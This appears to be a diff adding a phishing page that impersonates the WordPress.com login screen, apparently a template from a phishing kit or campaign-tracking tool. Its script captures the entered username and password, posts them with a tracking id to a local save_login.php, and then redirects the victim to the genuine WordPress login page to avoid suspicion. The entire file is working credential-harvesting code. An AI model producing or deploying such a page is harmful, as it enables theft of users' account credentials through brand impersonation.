@@ -1,0 +1,42 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Log In — WordPress.com</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fdfdfd;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px}
+.wp{color:#3858e9;font-size:32px;font-weight:600;margin-bottom:24px;text-align:center}
+h1{font-size:24px;text-align:center;margin-bottom:8px;color:#101517}
+.sub{text-align:center;color:#646970;font-size:16px;margin-bottom:24px}
+input{width:100%;height:48px;border:1px solid #8c8f94;border-radius:4px;padding:0 12px;font-size:16px;margin-bottom:12px}
+.btn-submit{width:100%;height:48px;background:#3858e9;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
+</style></head><body><div class="card"><div class="wp">W</div><h1>Log in to WordPress.com</h1><p class="sub">Email address or username</p><form id="loginForm"><input type="text" id="email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log In</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "wordpress" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/wordpress.com\/log-in"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
